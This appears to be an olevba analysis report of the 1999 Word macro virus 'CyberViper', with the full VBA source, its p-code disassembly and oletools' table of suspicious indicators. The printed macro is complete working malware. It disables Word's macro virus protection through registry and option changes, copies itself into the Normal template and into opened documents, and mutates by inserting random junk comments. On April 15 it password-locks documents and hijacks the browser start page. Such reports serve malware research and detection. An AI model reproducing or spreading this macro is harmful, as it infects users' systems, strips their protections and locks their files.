olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CViper
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CViper - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberViper.bas 
in file: Virus.MSWord.CViper - OLE stream: 'Macros/VBA/CyberViper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'@¡ä^PÏ9‘™šª
Sub AutoOpen()
'pWåÀ«s²WgvÜ8¡e4E/v

'×v§„†|fpU+Pã,nh�?~S�Œ?
Rem      Macro.Word97.CyberViper
Rem Copyright by Wit AKA CyberViper 1999
Rem     ( My first macro virus )
Rem       ( Stealth, Polimorf )
'4*�ßMeÒ

On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
With System
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
End With
'C•¨5¢³¼v0ƒ’+r7=^æ˜Vs~,{wÝVB…d†oS- h�Ðt–
With Options
 .VirusProtection = (((1 * 1) - 1) / 10)
 .SaveNormalPrompt = (((1 * 1) - 1) / 10)
 .ConfirmConversions = (((1 * 1) - 1) / 10)
End With
TmpFileName = "c:\CV.sys"
'~ uY¶ÒÄC5">kEãÎ”±=S%Å¼¾bz�À�HIh’d‰u’*�Ià
Call CyberMutate
'3•AÙ3xVÎ¶V¦S1&
If ThisDocument = NormalTemplate Then
  For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
'5ç§#“44¿X)[l\ÝãpW@@¡rr
  Next I
    NormalTemplate.VBProject.VBComponents("CyberViper").Export (TmpFileName)
'e ´ÈW¬pÂ
'Œ‹�1®S+Wàa¡hiaJJt›P©•˜/(>Qo”YÇÓ‰m
    ActiveDocument.VBProject.VBComponents.Import TmpFileName
    ActiveDocument.Saved = False
Else
'plIÏ>p™�±8`!¼Ø[MÞEsh`ã“‰:Ó&¾
  For I = 1 To NormalTemplate.VBProject.VBComponents.Count
'¸”™U…¾Ë2Œs.z«ƒqÝä–Š›1DX#>t��¼(q+^˜‡—aÕº“
        If NormalTemplate.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
'¯ÓLgŽgH“�;,žÇ tEƒâ¹l€�¦'¡Ód7uºgrµ
'[O€Rd(€IÌ•¶ÙbŒ0žrà6Øœe=Kæ:%e�Ø‹
'—¹®©¸S�…‘Xsfâ‡”}&k;¢>Gk3›
'O–¬U““æÚQÂ¹q�‚ƒ
  Next I
'À¦ÕÏs8Þ¿«p#A@…q5W ÉƒEÓj`ºKyOÏšjmÌ•Ú‡bÍS
    Application.VBE.ActiveVBProject.VBComponents("CyberViper").Export (TmpFileName)
    NormalTemplate.VBProject.VBComponents.Import TmpFileName
'ižCv?âV+À®R¾ÎäV|Ö
    NormalTemplate.Saved = False
    NormalTemplate.Save
'5=<
'„äy»]/Ï“ÌÁ¹Ø*ÄMV*ÔåT‹dJH9˜•Ë1Hž|YÆ]âo¾Á
End If
EndFind:
'ar>›3Iª„
'vÇK²ÓKäáÎˆ¢{? šÊi*…*jz[á"¢šŠ%¯^äZh
'‰V”I/Ó6¢ÔNÝÉx‚¹Æ
Kill TmpFileName
'Å¦°çcƒr«CtŒÂŒu…M›�¨Ñj\Z>‰L”hÏF¨µš
If Month(Now()) = 4 And Day(Now()) = 15 Then
 ActiveDocument.Password = "-=CyberViper=-"
'@+P·Þe¨¾'¾€I˜ÕÝ¢"¤à!Þ.Z”Á(*�^r
'…BW1ãX›]Ê_¿B\.‚z—&_;a¸�àÅŽ™FÔ
 ActiveDocument.Saved = False
'�ªÖÆ
'É-:àÆÄçO¤�
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "file://C:\CV.HTM"
 Open "c:\CV.HTM" For Output As #1
'7B)®Š
 Print #1, "<HTML><HEAD></HEAD><script LANGUAGE=" + Chr(34) + "JavaScript1.2" + Chr(34) + ">"
 Print #1, "a=1;setInterval(" + Chr(34) + "J()" + Chr(34) + ",10);function J(){a=a+.1;"
'œ¡TWÅÄ•åÖM«ä
 Print #1, "self.moveBy((Math.random()*a*2 -a),(Math.random()*a*2)-a);}</script></BODY></HTML>"
'z`.q’¸”¢Ás¿°ª²Fº-QÞÃKDOÙSS®¤º·
 Close #1
End If
End Sub
Sub FileTemplates()
'·p|‚
 Application.EnableCancelKey = wdCancelDisabled
 Options.VirusProtection = (((1 * 1) - 1) / 10)
'}µ¶oÔµ1ž®
 Options.ConfirmConversions = (((1 * 1) - 1) / 10)
End Sub
'•¤”+È+>_wtË+ÓO*
Sub ToolsMacro()
 Call FileTemplates
End Sub
Sub ViewVBCode()
Call FileTemplates
End Sub
Sub AutoClose()
 Call AutoOpen
End Sub
Sub AutoNew()
 Call AutoOpen
End Sub
Sub FileSaveAs()
'tc¬J(Ñ({³·ÄI}ÍÅr|e
 Call AutoOpen
'Ü}°oN˜Ž|¡¹
'žIE”0{ÕT½kY×ž�
'“Y\º"¸Â­)rÌ¾jàÎ+Ýhˆ¹*–
 Dialogs(wdDialogFileSaveAs).Show
End Sub
'/rc®^¿>–ßPÛ6äž—Ô’Q
Sub FileSave()
';(ªÈ‡Àäˆ-�a
 Call AutoOpen
 ActiveDocument.Save
';¥
End Sub
'ÁHß-,¾k
'‡·À
Sub CyberMutate()
Call ClearRem
For C2 = 1 To 50
  U2 = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
  M1 = Int((U2 * Rnd) + 1)
  F4 = Int((40 * Rnd) + 1)
  CRem = "'"
'nÄU§
  For C3 = 1 To F4
'w·Q
   CRem = CRem + Chr(Int((200 * Rnd) + 32))
  Next C3
  ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.InsertLines M1, CRem
Next C2
End Sub
Sub ClearRem()
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
'Ð’tÃ±Ó>º¥ÖÆ»»~³�@^}ÒÍ
For UU = 1 To UUEnd
'ÇqÁåSBª#cª65Zo�^[Á]kpÈq°£qÞ¡‡L”µ{ÔX¥ÒXi"
'…n5¼{¶—Æ#J.5b9 ‹£ŒÅ0F§zg=¬Ù
 If Mid(ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.Lines(UU, 1), 1, 1) = "'" Then
   ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.DeleteLines UU
'‚âKkoX„;‡á�Õ£xª,·¬ƒ?La
'+Ï@Q™i‰×�ß¸p·’y)'
   UU = UU - 1
 End If
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
Next UU
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.CViper
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/CyberViper - 9817 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B "@¡ä^PÏ9‘™šª"
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	QuoteRem 0x0000 0x0012 "pWåÀ«s²WgvÜ8¡e4E/v"
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0016 "×v§„†|fpU+Pã,nh�?~S�Œ?"
' Line #5:
' 	Rem 0x001D "      Macro.Word97.CyberViper"
' Line #6:
' 	Rem 0x0025 " Copyright by Wit AKA CyberViper 1999"
' Line #7:
' 	Rem 0x001D "     ( My first macro virus )"
' Line #8:
' 	Rem 0x001C "       ( Stealth, Polimorf )"
' Line #9:
' 	QuoteRem 0x0000 0x0007 "4*�ßMeÒ"
' Line #10:
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #14:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #15:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #16:
' 	LitDI4 0x0000 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #17:
' 	EndWith 
' Line #18:
' 	QuoteRem 0x0000 0x0027 "C•¨5¢³¼v0ƒ’+r7=^æ˜Vs~,{wÝVB…d†oS- h�Ðt–"
' Line #19:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x000A 
' 	Div 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x000A 
' 	Div 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x000A 
' 	Div 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #23:
' 	EndWith 
' Line #24:
' 	LitStr 0x0009 "c:\CV.sys"
' 	St TmpFileName 
' Line #25:
' 	QuoteRem 0x0000 0x0028 "~ uY¶ÒÄC5">kEãÎ”±=S%Å¼¾bz�À�HIh’d‰u’*�Ià"
' Line #26:
' 	ArgsCall (Call) CyberMutate 0x0000 
' Line #27:
' 	QuoteRem 0x0000 0x000E "3•AÙ3xVÎ¶V¦S1&"
' Line #28:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "CyberViper"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndFind 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0016 "5ç§#“44¿X)[l\ÝãpW@@¡rr"
' Line #32:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld TmpFileName 
' 	Paren 
' 	LitStr 0x000A "CyberViper"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #34:
' 	QuoteRem 0x0000 0x0008 "e ´ÈW¬pÂ"
' Line #35:
' 	QuoteRem 0x0000 0x0021 "Œ‹�1®S+Wàa¡hiaJJt›P©•˜/(>Qo”YÇÓ‰m"
' Line #36:
' 	Ld TmpFileName 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	QuoteRem 0x0000 0x001C "plIÏ>p™�±8`!¼Ø[MÞEsh`ã“‰:Ó&¾"
' Line #40:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	QuoteRem 0x0000 0x0028 "¸”™U…¾Ë2Œs.z«ƒqÝä–Š›1DX#>t��¼(q+^˜‡—aÕº“"
' Line #42:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "CyberViper"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndFind 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0021 "¯ÓLgŽgH“�;,žÇ tEƒâ¹l€�¦'¡Ód7uºgrµ"
' Line #44:
' 	QuoteRem 0x0000 0x0020 "[O€Rd(€IÌ•¶ÙbŒ0žrà6Øœe=Kæ:%e�Ø‹"
' Line #45:
' 	QuoteRem 0x0000 0x0019 "—¹®©¸S�…‘Xsfâ‡”}&k;¢>Gk3›"
' Line #46:
' 	QuoteRem 0x0000 0x000F "O–¬U““æÚQÂ¹q�‚ƒ"
' Line #47:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	QuoteRem 0x0000 0x0027 "À¦ÕÏs8Þ¿«p#A@…q5W ÉƒEÓj`ºKyOÏšjmÌ•Ú‡bÍS"
' Line #49:
' 	Ld TmpFileName 
' 	Paren 
' 	LitStr 0x000A "CyberViper"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #50:
' 	Ld TmpFileName 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #51:
' 	QuoteRem 0x0000 0x0011 "ižCv?âV+À®R¾ÎäV|Ö"
' Line #52:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #53:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	QuoteRem 0x0000 0x0003 "5=<"
' Line #55:
' 	QuoteRem 0x0000 0x0027 "„äy»]/Ï“ÌÁ¹Ø*ÄMV*ÔåT‹dJH9˜•Ë1Hž|YÆ]âo¾Á"
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Label EndFind 
' Line #58:
' 	QuoteRem 0x0000 0x0008 "ar>›3Iª„"
' Line #59:
' 	QuoteRem 0x0000 0x0022 "vÇK²ÓKäáÎˆ¢{? šÊi*…*jz[á"¢šŠ%¯^äZh"
' Line #60:
' 	QuoteRem 0x0000 0x0010 "‰V”I/Ó6¢ÔNÝÉx‚¹Æ"
' Line #61:
' 	Ld TmpFileName 
' 	ArgsCall Kill 0x0001 
' Line #62:
' 	QuoteRem 0x0000 0x0022 "Å¦°çcƒr«CtŒÂŒu…M›�¨Ñj\Z>‰L”hÏF¨µš"
' Line #63:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #64:
' 	LitStr 0x000E "-=CyberViper=-"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #65:
' 	QuoteRem 0x0000 0x001E "@+P·Þe¨¾'¾€I˜ÕÝ¢"¤à!Þ.Z”Á(*�^r"
' Line #66:
' 	QuoteRem 0x0000 0x001D "…BW1ãX›]Ê_¿B\.‚z—&_;a¸�àÅŽ™FÔ"
' Line #67:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #68:
' 	QuoteRem 0x0000 0x0004 "�ªÖÆ"
' Line #69:
' 	QuoteRem 0x0000 0x000A "É-:àÆÄçO¤�"
' Line #70:
' 	LitStr 0x0010 "file://C:\CV.HTM"
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main"
' 	LitStr 0x000A "Start Page"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #71:
' 	LitStr 0x0009 "c:\CV.HTM"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #72:
' 	QuoteRem 0x0000 0x0005 "7B)®Š"
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "<HTML><HEAD></HEAD><script LANGUAGE="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "JavaScript1.2"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ">"
' 	Add 
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "a=1;setInterval("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "J()"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 ",10);function J(){a=a+.1;"
' 	Add 
' 	PrintItemNL 
' Line #75:
' 	QuoteRem 0x0000 0x000C "œ¡TWÅÄ•åÖM«ä"
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "self.moveBy((Math.random()*a*2 -a),(Math.random()*a*2)-a);}</script></BODY></HTML>"
' 	PrintItemNL 
' Line #77:
' 	QuoteRem 0x0000 0x001E "z`.q’¸”¢Ás¿°ª²Fº-QÞÃKDOÙSS®¤º·"
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub FileTemplates())
' Line #82:
' 	QuoteRem 0x0000 0x0004 "·p|‚"
' Line #83:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #84:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x000A 
' 	Div 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #85:
' 	QuoteRem 0x0000 0x0009 "}µ¶oÔµ1ž®"
' Line #86:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x000A 
' 	Div 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #87:
' 	EndSub 
' Line #88:
' 	QuoteRem 0x0000 0x000F "•¤”+È+>_wtË+ÓO*"
' Line #89:
' 	FuncDefn (Sub ToolsMacro())
' Line #90:
' 	ArgsCall (Call) FileTemplates 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub ViewVBCode())
' Line #93:
' 	ArgsCall (Call) FileTemplates 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub AutoClose())
' Line #96:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub AutoNew())
' Line #99:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub FileSaveAs())
' Line #102:
' 	QuoteRem 0x0000 0x0012 "tc¬J(Ñ({³·ÄI}ÍÅr|e"
' Line #103:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #104:
' 	QuoteRem 0x0000 0x000A "Ü}°oN˜Ž|¡¹"
' Line #105:
' 	QuoteRem 0x0000 0x000E "žIE”0{ÕT½kY×ž�"
' Line #106:
' 	QuoteRem 0x0000 0x0016 "“Y\º"¸Â­)rÌ¾jàÎ+Ýhˆ¹*–"
' Line #107:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	QuoteRem 0x0000 0x0012 "/rc®^¿>–ßPÛ6äž—Ô’Q"
' Line #110:
' 	FuncDefn (Sub FileSave())
' Line #111:
' 	QuoteRem 0x0000 0x000B ";(ªÈ‡Àäˆ-�a"
' Line #112:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #113:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #114:
' 	QuoteRem 0x0000 0x0002 ";¥"
' Line #115:
' 	EndSub 
' Line #116:
' 	QuoteRem 0x0000 0x0007 "ÁHß-,¾k"
' Line #117:
' 	QuoteRem 0x0000 0x0003 "‡·À"
' Line #118:
' 	FuncDefn (Sub CyberMutate())
' Line #119:
' 	ArgsCall (Call) ClearRem 0x0000 
' Line #120:
' 	StartForVariable 
' 	Ld C2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #121:
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St U2 
' Line #122:
' 	Ld U2 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St M1 
' Line #123:
' 	LitDI2 0x0028 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St F4 
' Line #124:
' 	LitStr 0x0001 "'"
' 	St CRem 
' Line #125:
' 	QuoteRem 0x0000 0x0004 "nÄU§"
' Line #126:
' 	StartForVariable 
' 	Ld C3 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld F4 
' 	For 
' Line #127:
' 	QuoteRem 0x0000 0x0003 "w·Q"
' Line #128:
' 	Ld CRem 
' 	LitDI2 0x00C8 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St CRem 
' Line #129:
' 	StartForVariable 
' 	Ld C3 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	Ld M1 
' 	Ld CRem 
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #131:
' 	StartForVariable 
' 	Ld C2 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub ClearRem())
' Line #134:
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UUEnd 
' Line #135:
' 	QuoteRem 0x0000 0x0015 "Ð’tÃ±Ó>º¥ÖÆ»»~³�@^}ÒÍ"
' Line #136:
' 	StartForVariable 
' 	Ld UU 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld UUEnd 
' 	For 
' Line #137:
' 	QuoteRem 0x0000 0x0028 "ÇqÁåSBª#cª65Zo�^[Á]kpÈq°£qÞ¡‡L”µ{ÔX¥ÒXi""
' Line #138:
' 	QuoteRem 0x0000 0x001B "…n5¼{¶—Æ#J.5b9 ‹£ŒÅ0F§zg=¬Ù"
' Line #139:
' 	Ld UU 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #140:
' 	Ld UU 
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #141:
' 	QuoteRem 0x0000 0x0016 "‚âKkoX„;‡á�Õ£xª,·¬ƒ?La"
' Line #142:
' 	QuoteRem 0x0000 0x0011 "+Ï@Q™i‰×�ß¸p·’y)'"
' Line #143:
' 	Ld UU 
' 	LitDI2 0x0001 
' 	Sub 
' 	St UU 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	LitStr 0x000A "CyberViper"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UUEnd 
' Line #146:
' 	StartForVariable 
' 	Ld UU 
' 	EndForVariable 
' 	NextVar 
' Line #147:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

